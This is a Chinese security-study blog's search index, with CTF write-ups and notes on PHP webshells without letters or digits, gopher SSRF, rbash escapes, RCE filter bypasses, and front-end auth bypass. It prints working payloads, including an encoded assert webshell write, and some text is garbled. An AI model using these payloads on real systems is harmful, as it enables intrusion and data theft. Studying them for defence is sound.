[{"title":"本站指南：关于这里的记录","path":"/2025/12/23/本站指南：关于这里的记录/","content":"1# 👋 欢迎来到我的 Blog很高兴你能访问这里。建立这个博客的初衷，是为了对自己漫长的网络安全学习之路做一个系统的梳理和沉淀。 2# 这里的定位这不是一个随意灌水的地方，我主要会在这里分享两类内容： 3# 1. 🧩 知识点碎片 (Knowledge Points)在学习 Web 安全、内网渗透的过程中，我们总会遇到各种各样细碎但关键的知识点（比如某个特定的 Bypass 技巧、某个协议的特殊用法）。我会把这些碎片化的知识整理成文档，也会记录一些好的文章，方便随时查阅，也希望能帮到遇到同样问题的你。 你可以在菜单的 文档 - [Web知识点] 中找到它们。 3# 2. 🎯 靶场实战 WP (WriteUp)“纸上得来终觉浅”。除了理论，我会记录挑战各种CTF、综合靶场（如 VulnHub、Vulhub、HackTheBox 等）的完整过程。这部分内容会重点复盘： 思路的形成 遇到的坑与排错 最终的利用链条 你可以在菜单的 文档 - [WP] 中找到它们。 2# 🚀 关于作者一名正在路上的安全学习者。如果你对本站的内容有疑问，或者想交流技术，欢迎通过 社交 里的方式联系我。 Stay Hungry, Stay Foolish. (本文置顶显示，作为本站内容的索引说明)","tags":["计划","说明"],"categories":["杂谈"]},{"title":"Test Blank Page","path":"/test_blank.html","content":"Testing Page LayoutIf you can see this, layout: page is working."},{"title":"WP","path":"/wiki/WP/index.html","content":"Linux提权 文件夹 (包含子项) 📂 目录 PHP特性 文件夹 (包含子项) 📂 目录 REC 文件夹 (包含子项) 📂 目录 root-me 文件夹 (包含子项) 📂 目录 session 文件夹 (包含子项) 📂 目录 sql注入 文件夹 (包含子项) 📂 目录 Windows提权 文件夹 (包含子项) 📂 目录 反序列化 文件夹 (包含子项) 📂 目录 文件上传 文件夹 (包含子项) 📂 目录 文件包含 文件夹 (包含子项) 📂 目录 SSRF_内网访问 点击阅读详细内容... 📝 文档 无字母数字webshell 点击阅读详细内容... 📝 文档"},{"title":"JS渗透","path":"/wiki/笔记/JS渗透.html","content":"先找到JS文件 熊猫头 Packer-Fuzzer 异步js JS接口提取 脚本文件 目录FUZZ和接口提取的奇妙搭配 我们假设你通过分析JS找到了很多接口，比如 http://test.hack.com/api/test/admin/delete http://test.hack.com/api/test/admin/edit http://test.hack.com/api/test/admin/get 这种时候我们要注意了，接口的命名一般都和功能高度相关。这里有管理员用户的删除（delete）、编辑（edit）、获取（get） 那么你还能想到什么？是不是有可能能有添加（add、create）。那我们可以注意FUZZ这个点 http://test.hack.com/api/test/admin/add http://test.hack.com/api/test/admin/create 总之就是有“添加”这个意思的单词。对于增删改查的接口关键词，我自己总结了一些。 查询（获取信息）search list select query get find 删除（删除某个数据）del Delete 编辑（更新某个信息）Update Up edit Change 添加（增加某个信息）add create new API测试 GET POST 测试 别忘了路径可能有问题 POST参数测试 返回内容拼接 JS查找 脚本获取 路径三种情况 第一种是目标站点没有任何对前端uri的鉴权。我们这么去访问，能直接看到页面，也不会给你跳转啥的，这时候就可以调用页面上的功能去抓包，分析这些功能点对应的接口的问题了。 第二种情况稍微好点，就是你这么去访问，有概率看到要访问的页面闪一下，然后给你重定向回登录页面，这种时候有种拼手速的玩法，在重定向回登录页面之前，浏览器上的刷新按钮会变成这个状态：在他重定向回去之前，快速点一下这个X，那么后续动作就会终止执行，你的页面就会卡住。这时候我们也是开启burp愉快抓包就行。其实就是阻止重定向的思路。 - font style=color:rgb(0,0,0);第三种情况就是，我们没法看到想访问的页面，前端要么没反应，要么给你弹出个没有权限，要么直接重定向到/fontfont style=color:rgb(0,0,0);/login/fontfont style=color:rgb(0,0,0);登录页。这种时候我们又该怎么测试呢？下面的内容就需要一点前端调试和/fontfont style=color:rgb(0,0,0);JS/fontfont style=color:rgb(0,0,0);分析的基础了，本文不会深入展开，仅作案例介绍。/font 假设这么一个网站，我们提取出一个前端uri为home （很常见） 我们自然要尝试访问，一访问，发现直接给我们重定向到登录口 我们自然要尝试访问，一访问，发现直接给我们重定向到登录口 这就说明这个前端至少有两层校验，一层与用户登录状态有关，一层与用户权限有关。怎么办呢？我们在控制台搜索“内测”关键词，定位到用户权限鉴权逻辑。 分析这个局部，我们其实很容易能注意到这里的前端鉴权逻辑。前端获取o.state.account.permission属性，一旦这个属性为false，那么就会提示平台内测这个错误，无法访问到对应的前端uri。 那么用户登录状态对应什么属性呢？往上翻一下，不难看出对应o.state.baseInfo.isLogin属性 因此我们可以推测，state中保存了用户的基本信息，比如登录状态、权限等等。因此这里好办了，我们给上述两个位置打上断点，重新访问home。进入第一个断点 在控制台将其强行改为true 进入下一断 同样地，再控制台对其赋值为1 再往下走，此时会跳转到一个contract页面 虽然没进入home页面，但是这样，我们就来到了一个原本无法直接访问到的一个前端uri，这样就可以调用它的功能了，看这个页面要填的东西很多，最后的传参肯定巨复杂，就算开发好心告诉你缺了什么参数，你敲都要敲半天，用这种方法测起来就快多了。 当然，我们的目的是进入home页面，重定向到这个完善账号信息的页面，说明还是有哪里的鉴权没搞好，我们再回到刚刚的鉴权逻辑部分 可以发现，后续其实还对o.state.account.permission的值做了一个判断，如果值为1，那么会直接进入contract页面。值只要是大于1的整数，其实都可以访问到home页面 因此在控制台将permission改为3 再访问home，成功： 这样，我们就可以愉快的测试后台的各种功能点了。当然上述操作对不懂JS和前端调试的师傅肯定也不太友好。实际上上述操作和平时测试业务逻辑漏洞中的“修改返回包”操作是有等价关系的。为什么这么说呢？ 我们重新访问一下home页面，然后在burp抓包，拦截一下返回包。 可以看到一个state_user的后端接口，从这个接口的名字我们其实就知道，它是用来判断一个用户状态的。 然后你再注意这里的account_state，默认是0。以及这个is_login，默认是false。他们是不是就特别像我们刚刚在JS里分析出来的o.state.account.permission和o.state.baseInfo.isLogin？我们推测这个前端实际上就是从返回包里拿到account_state和is_login，并分别给o.state.account.permission、o.state.baseInfo.isLogin赋值的。 因此我们将其分别改为3和true，然后把另一个code改为200，发包 还是能看到后台页面。这样虽然操作起来比较简单友好，但是万一目标前端对响应结果的判断设置的比较复杂，那就不是那么好办了，比如我前端判断permission为test123abcdef才为有效，我们常见的改响应包的方法就很难改成这样了，所以还是回到JS去分析调试才能应对大部分奇葩情况，还是比较吃基本功的。 json传参里常见的类型其实也就是下图这些 a为整型，b为字符串类型，c为布尔类型，d为数组类型，e为对象类型。这几种类型都试一下准没错，而且大多数情况下类型错了后端是要直接抛出异常信息的，从异常信息里就很容易能看出来这个地方要传入什么类型，比如异常里看到xxxxx Object xxxxxx，就可以猜测某个参数可能要传入对象类型的传参。 来源：公众号:HW专项行动小组","tags":[null]},{"title":"文档库","path":"/wiki/index.html","content":"Web知识点 文件夹 (包含子项) 📂 目录 WP 文件夹 (包含子项) 📂 目录 内网 文件夹 (包含子项) 📂 目录 笔记 文件夹 (包含子项) 📂 目录"},{"title":"无字母数字webshell","path":"/wiki/WP/无字母数字webshell.html","content":"打开题目只有一段where is the flag?右键查看源代码，发现提示!-- hint:?cmd= --，加上请求参数后重新访问出现代码。关键点是两个正则表达式，分别为preg_match(/[A-Za-oq-z0-9$]+/,$cmd)和preg_match(/\\~|\\!|\\@|\\#|\\%|\\^|\\|\\*|\\(|\\)|\\（|\\）|\\-|\\_|\\{|\\}|\\[|\\]|\\|\\|\\:|\\,/,$cmd)，这两个正则将除了p字母以外的所有字母数字和一些特殊符号进行了过滤。 PHP上传机制：在php中，使用Content-Type: multipart/form-data;上传文件时，会将它保存在临时文件中，在php的配置中upload_tmp_dir参数为保存临时文件的路经，linux下面默认为/tmp。也就是说只要php接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且php每次创建的临时文件名都有固定的格式，为phpXXXX.tmp（Windows中）、php**.tmp（Linux中） PHP中反引号作用：在php里面反引号里面的内容会被当做shell命令被执行。例如?php echo`whoami`; ? 会直接当作命令执行.号相当于source命令，这个命令可以直接把文件内容当作命令执行，相当于把文件直接当作shell脚本执行?=相当于?php ehco的简写版?相当于字符的通配符 payload: ?cmd??.+/??p/p?p??????; ?：闭合前面的?php命令?=：相当于?php echo反引号:执行命令.相当于source命令+：相当于空格?：文字通配符，负责执行上传的临时文件 构造数据包 POST /?cmd=??=`.+/??p/p?p??????`; HTTP/1.1Host: bcb5cac6-1033-4f9b-89a0-e618dcbfc700.challenge.ctf.showUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888Content-Length: 230-----------------------------10242300956292313528205888Content-Disposition: form-data; name=fileUpload; filename=1.txtContent-Type: text/plain#! /bin/bashcat /flag.txt-----------------------------10242300956292313528205888-- boundary=:boundary定义边界符 #! /bin/bash指定上传内容是bash脚本， cat ../../../flag.txt执行命令得到flag（在这之前先逐次执行ls命令，不断返回上一层，查找flag.txt的位置） https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html","tags":[null]},{"title":"笔记","path":"/wiki/笔记/index.html","content":"JS渗透 点击阅读详细内容... 📝 文档 linux学习 点击阅读详细内容... 📝 文档 网络 点击阅读详细内容... 📝 文档 网络安全 点击阅读详细内容... 📝 文档"},{"title":"内网","path":"/wiki/内网/index.html","content":"提权 文件夹 (包含子项) 📂 目录 权限维持 点击阅读详细内容... 📝 文档"},{"title":"SSRF_内网访问","path":"/wiki/WP/SSRF_内网访问.html","content":"伪协议 file://php://input # 执行php代码php://filter # 读取源码 write的话GET提交?file=php://filter/wirte=convert.base64-decode/resource=2.phpPOST提交content=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=zip:// #压缩文件data:// #执行php代码 ?url=data://text/plain,?php system(ls);? gopher协议 gopher协议（攻击内网服务的万金油）：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell(具体看脚本文件)from urllib.parse import quotepayload = \\POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedContent-Length: 36key=260a97ac2ef360dec36238c7d6c49c25payload = quote(payload)payload = payload.replace(%0A, %0D%0A)payload = fgopher://127.0.0.1:80/_quote(payload)print(payload)URL: gopher://host:port/gopher-path_后接TCP数据流---也就是构造的包（要进行url编码，具体几次看情况）(!!!一定要有下斜杠)gopher协议中的post请求需要包含几个必要的字段HOST，Content-Length,Content-Type POST请求编码出来的换行是%0A，就需要把%0A改成%0D%0Agopher://127.0.0.1:80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D260a97ac2ef360dec36238c7d6c49c25%250D%250A fastcgi协议（进程间通信） CGI协议 # 访问url -- 浏览器生成HTTP请求报文 -- web server解析请求（例如nginx）web server 是内容的分发者当访问静态页面时，web server 会直接返回资源，例如index.html当访问动态页面时，web server 会调用解析器，例如index.php # -- 访问CGI# -- CGI初始化环境，加载配置，处理请求，返回资源，结束进程 （每次处理请求后都会销毁进程，浪费资源）FASTCGI # 访问url -- 浏览器生成HTTP请求报文 -- web server解析请求（例如nginx）当访问index.php时，web server 会把HTTP请求转换为FastCGI请求# -- 转换为FastCGI协议格式并发送给解析器，这里以php为例# -- 发送至php-fpm process managerphp-fpm接收到请求后，把请求分配给一个worker，worker就是一个解析服务的进程（一直运行），worker根据请求信息，解析php，返回页面例如，招新平台运行了15个worker，（不考虑nginx处理时间）同时可以处理15个请求# -- php-fpm解析并响应 redis 协议，和上面一样，可以直接用gopherus 的redis模块 ，使用默认的，会自动生成shell.php cmd为密码 SSRF Bypass url Bypass 1.使用HTTP基础认证 HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。也就是：http://www.xxx.com@www.yyy.com形式简单来说，就是http://www.baidu.com@192.168.0.1/与http://192.168.0.1请求的都是192.168.0.1的内容。这里的@是主域名解析，即@符号后面直接跟域名，@符号前面的内容会被视为用户名，相当于以http://baidu.com的用户名访问192.168.0.1/flag.php，至于用户名是啥不重要，关键是@后面的才是解析的地址！2.使用nip.io .nip.io 是一个特殊的域名后缀，它提供了一种免费且简便的方式，可以将特定格式的域名解析为对应的IP地址，可以作为应用路由的解析服务。这省去了配置本地hosts文件的步骤。例如，当访问http://anything-IP Address.nip.io时，它将解析到对应的IP地址IP Address?url=http://notfound.ctfhub.com.127.0.0.1.nip.io/flag.php 数字IP Bypass 1.ip转int 2.十六进制3.八进制4.localhost、http://0/等5.ipv6绕过 302跳转 Bypass 需要vps 暂时跳过 DNS重解析 对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass过滤掉.但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击，利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0，这是为了防止有DNS服务器对解析结果进行缓存。这样就可以进行攻击了，完整的攻击流程为：1、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP2、对于获得的IP进行判断，发现为非黑名单IP，则通过验证3、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址4、由于已经绕过验证，所以服务器端返回访问内网资源的结果总结来说：由于我们无法在程序运行时以毫秒为单位手动更改DNS记录，所以要想实现DNS重绑定攻击，就必须配置一个自定义的恶意DNS服务器，并设定好指定域名的解析IP，再将TTL设置为0，使其解析时在非法内网IP与合法其他IP间反复横跳。用下面这个网站可以进行DNS重绑定rbndr.us dns rebinding service (cmpxchg8b.com)绑定的两个ip中保证有一个是127.0.0.1即可，我这里和192.168.0.1绑定了，结果为7f000001.c0a80001.rbndr.us因此我们的url=7f000001.c0a80001.rbndr.us/flag.php ，注意这个域名相当于绑定了两个ip地址（同一时刻只对应一个），由于无法确定进行dns校验时的ip是否为127.0.0.1，可能一次请求不成功，多刷新几次即可。","tags":[null]},{"title":"linux学习","path":"/wiki/笔记/linux学习.html","content":"stdin stdout stderr对应文件标识符：0 1 2 如果我们想将 STDOUT 和 STDERR 重定向到一个文件，我们可以使用font style=color:rgb(51, 51, 51);background-color:rgb(247, 247, 247);/font。这个“”代表 FD 1 和 FD 2 表示 1和2 重定向 追加 覆盖 | 管道符 rm -r r 递归创建文件 touchuniq 去除相邻重复行 想要去除整个文件，可以先sort，然后去除 cat animals | tee unsorted.txt | sort | uniq sorted.txt tee的作用是将另一个命令输出的 STDIN 传递过去，同时将副本写入文件 用户权限 uid(用户标识符) root 0 普通 1-501 useradd -u 指定uid -d 指定目录 passwd -d 清空密码 -l 锁定账户 -u 解锁 -S 是否锁定 usermod -l 更改名字 -L 锁定 -U 解锁 userdel -r 文件权限or目录权限 r w x chmod -R递归修改权限 umask 设定文件初始权限 chown 属主 文件或目录 set位 s 粘滞位 t 共享文件用 chattr i 全锁 a 修改锁 +，-，用法相同 网络route route add -net 我要去哪 gw 下一跳地址 route add default gw 网关 修改网络 vim etcsysconfignetwork-scriptsifcfg-xxx BOOTPROTOdhcp -static safe_onbootyes ipaddr netmask gateway dns1 dns2 查看dns cat etcresolv.conf","tags":[null]},{"title":"Web知识点","path":"/wiki/Web知识点/index.html","content":"SQL注入 文件夹 (包含子项) 📂 目录 xss 文件夹 (包含子项) 📂 目录 xxe漏洞 文件夹 (包含子项) 📂 目录 工具指南 文件夹 (包含子项) 📂 目录 常见密码&路径 文件夹 (包含子项) 📂 目录 文件上传 文件夹 (包含子项) 📂 目录 文件下载 文件夹 (包含子项) 📂 目录 文件包含 文件夹 (包含子项) 📂 目录 逻辑越权 文件夹 (包含子项) 📂 目录 漏洞发现 点击阅读详细内容... 📝 文档"},{"title":"权限维持","path":"/wiki/内网/权限维持.html","content":"SharPersist.exe","tags":[null]},{"title":"网络","path":"/wiki/笔记/网络.html","content":"lan–wanNAT –switch–route lan 局域网，switch 是按mac地址区分，一旦经过路由器，就会变成ipdns查看上一条信息是否成功 echo $?","tags":[null]},{"title":"漏洞发现","path":"/wiki/Web知识点/漏洞发现.html","content":"","tags":[null]},{"title":"Linux提权","path":"/wiki/WP/Linux提权/index.html","content":"rbash 点击阅读详细内容... 📝 文档"},{"title":"MD5绕过","path":"/wiki/WP/PHP特性/MD5绕过.html","content":"知识点弱比较类型字符串和数字进行比较时，会把字符串强制转换为数字(如果字符串开头有数字，则转换为开头数字，没有则转换为0) ==：只比较数据值——数据值相同，不比较数据类型!=: 只比较数据值——数据值不同 var_dump(123==123a);#bool(true)var_dump(123==1234a);#bool(false)var_dump(0==abc);#bool(true) 强比较类型不仅要比较数据的值也要比较数据的类型，例如str和int两种数据类型就不会相等 ===：比较数据类型——数据类型相同 比较数据值——数据值相同!==：比较数据类型——数据类型不同 || 比较数据值——数据值不同 var_dump(123===123a);#bool(false)var_dump(123===123);#bool(false)var_dump(123===123);#bool(true 当php处理字符串时，会利用“ ”或者“ ”来比较 当“”时： php把每一个以”0E”开头的哈希值都解释为0，所以要绕过””，需要想办法让两边的不同数值经过md5加密后都为“0E”开头，这样当处理到这里的代码时，php会认为它们两个都为0，即可绕过。 开头为0E（MD5值）字母数字混合类型：s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904纯大写字母：QLTHNDT0e405967825401955372549139051580QNKCDZO0e830400451993494058024219903391EEIZDOI0e782601363539291779881938479162纯数字：2406107080e46209743190650901956298873685440116270630e48580568703443990593836270177547756350650e99821208994664096759945036116847905553610e643442214660994430134492464512 5432453531 0e51231869908588163086189052609755796798200e877622011730221803461740184915 55853935790e66435735538230580599276533702363765525010e165886706997482187870215578015 7124129977 0e500007361044747804682122060876 71975461970e9151885760724691014573156755027656486157 0e451569119711843337267091732412 php中的md5()函数无法处理数组类型数据，对于数组类型数据返回NULL，当我们传入两个数组时，就会变成两个NULL，也就是NULLNULL，成功绕过 当为“”：在类型相同时才相等。”“即non-strict比较符，会在类型转换后进行比较。 此外0 字符会被认为是正确的，可以绕过验证。","tags":[null]},{"title":"特性","path":"/wiki/WP/PHP特性/特性.html","content":"1.intval()intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1 intval($num, 0) 的作用:intval() 是 PHP 函数，用于将变量 $num 转换为整数。参数 0 表示进制自动检测：如果 $num 以 0x 或 0X 开头（如 0x117c），按十六进制转换。如果 $num 以 0 开头（如 010574），按八进制转换。其他情况（如 4476），按十进制转换。 2. 正则show_source(__FILE__);include(flag.php);$a=$_GET[cmd];if(preg_match(/^php$/im, $a)) if(preg_match(/^php$/i, $a)) echo hacker; else echo $flag; else echo nonononono; /i表示匹配大小写字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾/m 多行匹配 若存在换行 并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配但是当出现换行符 %0a的时候，$cmd的值会被当做两行处理，而此时第二个if正则匹配不符合以php开头和以php结尾 3.in_array()in_array(search,array,type)如果给定的值 search 存在于数组 array 中则返回 true。如果第三个参数设置为 true，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。如果没有在数组中找到参数，函数返回 false。注释：如果 search 参数是字符串，且 type 参数设置为 true，则搜索区分⼤⼩写。 没有第三个参数的时候进⾏的就是弱⽐较，就会存在强制的类型转换，如123.php就会转换成123 4.优先级 and5. 反射类反射类ReflectionClass执⾏命令ReflectionClass反射类在PHP5新加⼊，继承⾃Reflector，它可以与已定义的类建⽴映射关系，通过反射类可以对类操作反射类不仅仅可以建⽴对类的映射，也可以建⽴对PHP基本⽅法的映射，并且返回基本⽅法执⾏的情况。因此可以通过建⽴反射类new ReflectionClass(system(cmd))来执⾏命令 6.is_numeric()is_numeric() ⽤于检测是否为数字或数字字符串，如果指定的变量是数字和数字字符串则返回true ，否则返回false。如果字符串中含有⼀个e代表科学计数法，也可返回true。 7.call_user_func()call_user_func() 函数⽤于调⽤⽅法或者变量，第⼀个参数是被调⽤的函数，第⼆个是调⽤的函数 的参数 8.","tags":[null]},{"title":"rbash","path":"/wiki/WP/Linux提权/rbash.html","content":"什么是rbashrbash,即受限制的 bash,其可以用作中转服务器（实际上rbash只是bash的一个软链接）。它与一般shell的区别在于会限制一些行为，让一些命令无法执行。 如何设置rbash1，复制一个bash，重命名为rbash cp /bin/bash /bin/rbash2，设置用户tom登陆的shell为rbash useradd -s /bin/rbash tom3, 在tom用户下新建一个.bin目录存放可以执行的命令 mkdir -p /home/tom/.bin4, 通过软连接执行命令 ln -s /bin/clear /home/$tom/.bin/clear5, 编辑文件/home/$tom/.bashrc,添加export PATH=$HOME/.bin/.文件一定要以# .bashrc为首行. 如何绕过限制信息收集tom@DC-2:~$ echo $PATH/home/tom/usr/bintom@DC-2:~$ echo /home/tom/usr/bin/*/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/viemv 查看环境变量 特别是查看shell 和PATH检查编程语言 java php ...sudo -l 常见的逃逸技术 “ ” 如果允许，直接运行binbash cp cp /bin/bash test1cp /bin/sh test2./test1 # 切换到了/bin/bash./test2 # 切换到了/bin/sh 常见的应用 1 ftp,gdb,man ftp !/bin/sh gdb !/bin/sh man !/bin/sh2 git git git help status3 vi/vim :set shell=/bin/bsah :shell 或者 :!/bin/bash4 BASH_CMDS[a]=/bin/sh;a #把/bin/bash给a变量export PATH=$PATH:/bin/ #将/bin 作为PATH环境变量导出export PATH=$PATH:/usr/bin #将/usr/bin作为PATH环境变量导出","tags":[null]},{"title":"REC过滤","path":"/wiki/WP/REC/REC过滤.html","content":"RECping -c 1 wwww.baidu.com ping -c 1 wwww.baidu.com 在命令执行有下面几种可能： 命令可控 比如我们可以控制ping这个字符串 参数可控 -c 可控 参数值可控 1和www.baidu.com 可控 整体可控，但是要突破过滤 我们遇到命令执行，需要首先判断可控的位置，然后针对性的绕过 可以用系统函数:system exec highlight system(‘ls’); exec() **exec()**默认没有回显,需要手动加上echo.而且只会回显出一行结果,因此常用第二个数组参数接收多行结果. payload:$arr=[]; echo exec(ipconfig,$arr); var_dump($arr); **shell_exec()**默认没有回显,需要手动加上echo,可以输出多行结果. payload:echo shell_exec(ipconfig); highlight 其他函数 passthru echo php伪协议 show_source passthru(‘ls’); 同 system echo tac config.php; PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。 - 伪协议:include(php://filter/read=convert.base64-encode/resource=config.php); - show_source(config.php); //和highlight_file() 一样，将指定 PHP 文件的源代码以高亮形式输出到浏览器或返回为字符串 用get方式 ?c=echo \\`$_GET[1]`\\;1=tac config.php 构造system ?c=$a=sys;$b=tem;$d=$a.$b;$d(cat config.php); cat 被过滤：除了cat 还有 tac、more、 less、head、tail、nl、sed、sort、uniq、rev 文件本身被过滤，可以模糊匹配 con* ，也可以base64加密解密 ?c=$a=base64_decode(Y2F0IGNvbmZpZy5waHA=);passthru($a); Y2F0IGNvbmZpZy5waHA=是cat config.php的base64加密 如果；被禁，可以尝试闭合整个php代码 ? 参数是C 可以用$_GET[a] 来绕过 1.涉及到一个php的代码结构，.....②payload为：?c=include $_GET[a]?，等同于，php的最后一行代码可以省去分号.....③include函数包含文件，且题目是对参数c正则过滤，因此GET型传参a可以绕过，从而执行我们的伪协议文件命令，读取config.php文件：php://filter/convert.base64-encode/resource=./config.php④因此连起来构造的payload为： ?c=include $_GET[a]?a=php://filter/convert.base64-encode/resource=config.php2./?c=echo `$_GET[a]`?a=cat config.php 让其echo一个get请求，?闭合，请求内容为cat config.php 也可以用post来绕过：先?cecho $_POST[a\\];然后再用hackbar传参数 a cat config.php 只禁用了*和?常用通配符，还可以使用其他通配符[c1-c2],[!c1-c2],[list]等 payload：?cecho tac confi[g][!0-9]ph[p]; nginx 日志文件路径 varlognginxaccess.log 可以用 cvarlognginxaccess.log1system(“tac%2036d.php”); 来绕过c 的检测 print_r(glob(“*”)) : glob()函数返回匹配指定模式的文件名或目录。因此我们可以使用glob函数来查找文件，也可以实现目录的遍历 scandir()也可以，具体用法 :print_r(scandir(‘.‘)) 文件包含的用处在php中利用该函数可以将其他文件引入当前php文件，被引入的文件里有php语句就能正常发挥作用 可以先引入文件，再用中国蚁剑连接 也可以直接用，参考12 过滤空格cat$IFSflag.txtcat$IFS$9flag.txt $IFS$1 也可以catflag.txt catflag.txt %0a代替换行，%09代替TAB键 过滤 ：可以先目录再查看 cd xxxx;cat xxx","tags":[null]},{"title":"REC","path":"/wiki/WP/REC/index.html","content":"linux标准输入输出 点击阅读详细内容... 📝 文档 REC过滤 点击阅读详细内容... 📝 文档 无参数REC 点击阅读详细内容... 📝 文档 无字母 点击阅读详细内容... 📝 文档 获取目录 点击阅读详细内容... 📝 文档 读取文件 点击阅读详细内容... 📝 文档"},{"title":"PHP特性","path":"/wiki/WP/PHP特性/index.html","content":"MD5绕过 点击阅读详细内容... 📝 文档 特性 点击阅读详细内容... 📝 文档"},{"title":"无参数REC","path":"/wiki/WP/REC/无参数REC.html","content":"代码if(isset($_GET[c])) $c = $_GET[c]; if(!preg_match(/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\|\\*|\\（|\\）|\\-|\\=|\\+|\\|\\[|\\]|\\|\\:|\\|\\|\\,|\\|\\.|\\|\\/|\\?|\\\\\\\\/i, $c)) eval($c); else highlight_file(__FILE__); 常见绕过姿势getallheaders()：返回所有的HTTP头信息，返回的是数组⽽eval要求为字符串，所以要⽤implode()函数将数组转换为字符串get_defined_vars()：该函数的作⽤是获取所有的已定义变量，返回值也是数组，不过是⼆维数组，⽤var_dump()输出可以看⻅输出的内容，看⻅在第⼏位之后，可以⽤current()函数来获取其值，详细可以看官⽅函数。payload：var_dump(current(get_defined_vars()));session_id()：session_id()可以⽤来获取/设置当前会话 ID，可以⽤这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。 如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后⽤hex2bin()函数，即传⼊?exp=eval(hex2bin(session_id(session_start()))); 并设置cookie：PHPSESSID=706870696e666f28293b session_start 函数是为了开启session配合使⽤的函数：print_r(scandir(‘.’)); 查看当前⽬录下的所有⽂件名 var_dump()localeconv() 函数返回⼀包含本地数字及货币格式信息的数组。current() 函数返回数组中的当前元素（单元）,默认取第⼀个值，pos是current的别名each() 返回数组中当前的键/值对并将数组指针向前移动⼀步end() 将数组的内部指针指向最后⼀个单元next() 将数组中的内部指针向前移动⼀位prev() 将数组中的内部指针倒回⼀位array_reverse() 以相反的元素顺序返回数组 payload1?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv()))))); 解释?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));：这是一个GET请求的参数c，其值是一个PHP表达式。echo：PHP中的输出函数，用于输出字符串或表达式的结果。highlight_file：PHP中的函数，用于高亮显示PHP文件的内容。next：PHP中的函数，用于将内部指针向前移动到下一个元素。array_reverse：PHP中的函数，用于反转数组元素的顺序。scandir：PHP中的函数，用于列出目录中的文件和子目录。pos：PHP中的函数，返回数组中当前内部指针指向的值。localeconv()：PHP中的函数，返回本地化的数字和货币格式信息。 具体来说，这段代码的执行流程如下：localeconv()：获取本地化的数字和货币格式信息。pos(localeconv())：获取localeconv()返回数组中当前内部指针指向的值。scandir(pos(localeconv()))：列出pos(localeconv())指向的目录中的文件和子目录。array_reverse(scandir(pos(localeconv())))：反转这些文件和子目录的顺序。next(array_reverse(scandir(pos(localeconv()))))：将内部指针移动到下一个元素，即下一个文件或子目录。highlight_file(next(array_reverse(scandir(pos(localeconv())))))：高亮显示这个文件的内容。echo：输出这个高亮显示的内容。 payload2?c=eval(next(reset(get_defined_vars())));1=;system(tac%20flag.php); 解释?c=eval(next(reset(get_defined_vars())));：这是GET请求的一部分，其中c参数的值是一个PHP表达式。get_defined_vars()：这个函数返回当前所有已定义变量的数组，包括局部变量和全局变量。reset()：这个函数将数组内部指针指向第一个元素，并返回该元素的值。next()：这个函数将数组内部指针向前移动一位，并返回当前指针处的元素值。eval()：这个函数执行字符串作为PHP代码。这段代码的目的是尝试执行get_defined_vars()返回的第一个元素的下一个元素的值作为PHP代码。1=;system(tac%20flag.php);：这是GET请求的另一部分，尝试通过URL参数执行系统命令。system()：这个函数执行一个shell命令，并将完整的输出返回。tac%20flag.php：这里的命令是tac flag.php，tac是反向输出文件内容的Unix命令，%20是URL编码的空格。这段代码的目的是尝试执行flag.php文件的反向内容。 payload3题解，查看当前工作目录getcwd()，扫描当前目录及文件scandir()输出 为数组，flag.php 在倒数第二个个位置那就数组倒置array_revers()，变为正数第二，在使用next()函数指向从第一个指向第二个（及指向flag.php）,最后使用show_source（）查看文件的内容 ?c=print_r(show_source(next(array_reverse(scandir(getcwd())))));url+?c=print_r(getcwd()); === /var/www/htmlurl+?c=print_r(scandir(getcwd())); === Array ( [0] = . [1] = .. [2] = flag.php [3] = index.php 